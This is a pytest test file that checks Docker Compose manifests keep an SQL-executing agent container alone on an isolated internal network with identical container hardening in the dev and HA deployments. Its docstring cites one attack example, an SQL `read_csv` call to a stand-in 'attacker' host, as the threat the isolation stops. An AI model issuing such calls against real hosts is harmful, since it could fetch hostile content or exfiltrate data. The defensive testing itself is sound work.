"""Agent sandbox wiring in the compose files.

The agent runs a broad SQL surface governed by the API's statement policy rather
than a hard allowlist, so it must be contained at the OS layer. Both compose
files must apply the same container hardening, and the agent must sit on the
isolated `duckhaven_internal` network **alone** — that is the control that stops
`read_csv('http://attacker/…')` reaching an arbitrary host.

Scope note: this asserts the *manifest*. Whether Docker's `internal: true`
actually blocks egress cannot be checked from a pytest process outside the
compose network; that is verified by the documented runtime command in
docs/concepts/sql-sessions.md. What CI can guarantee is that the wiring never
silently regresses — e.g. the agent quietly regaining the default network.
"""

from pathlib import Path

import yaml

DEPLOY = Path(__file__).resolve().parents[2] / "deploy"

with (DEPLOY / "docker-compose.yml").open() as f:
    DEV = yaml.safe_load(f)
with (DEPLOY / "docker-compose.ha.yml").open() as f:
    HA = yaml.safe_load(f)

COMPOSE_FILES = (("dev", DEV), ("ha", HA))

# Everything the agent must be able to reach must share its isolated network.
AGENT_PEERS = {"dev": ("api", "polaris", "minio"), "ha": ("caddy", "polaris", "minio")}


def test_internal_network_declared_in_both_files():
    for name, compose in COMPOSE_FILES:
        networks = compose["networks"]
        assert "duckhaven_internal" in networks, name
        assert networks["duckhaven_internal"]["internal"] is True, name


def test_agent_is_only_on_the_internal_network():
    """The whole control: one extra network on this list re-opens egress."""
    for name, compose in COMPOSE_FILES:
        assert compose["services"]["agent"]["networks"] == ["duckhaven_internal"], name


def test_agent_peers_join_the_internal_network():
    for name, compose in COMPOSE_FILES:
        for peer in AGENT_PEERS[name]:
            networks = compose["services"][peer]["networks"]
            assert "duckhaven_internal" in networks, f"{name}:{peer}"
            # They keep their own outbound access (OIDC, external object stores).
            assert "default" in networks, f"{name}:{peer}"


def test_both_api_replicas_join_the_internal_network():
    for replica in ("api-1", "api-2"):
        assert "duckhaven_internal" in HA["services"][replica]["networks"], replica


def test_egress_opt_out_override_exists_and_only_changes_networks():
    path = DEPLOY / "docker-compose.egress-opt-out.yml"
    assert path.is_file()
    with path.open() as f:
        override = yaml.safe_load(f)
    assert set(override["services"]) == {"agent"}
    assert set(override["services"]["agent"]) == {"networks"}
    assert "default" in override["services"]["agent"]["networks"]


def test_agent_container_hardening_in_both_files():
    """The dev and HA agents must be hardened identically.

    The HA file previously carried none of this, leaving the production-shaped
    deployment less contained than the dev one.
    """
    for name, compose in COMPOSE_FILES:
        agent = compose["services"]["agent"]
        assert agent["read_only"] is True, name
        assert "/tmp" in agent["tmpfs"], name
        assert "no-new-privileges:true" in agent["security_opt"], name
        assert agent["cap_drop"] == ["ALL"], name
        assert agent["pids_limit"] == 512, name
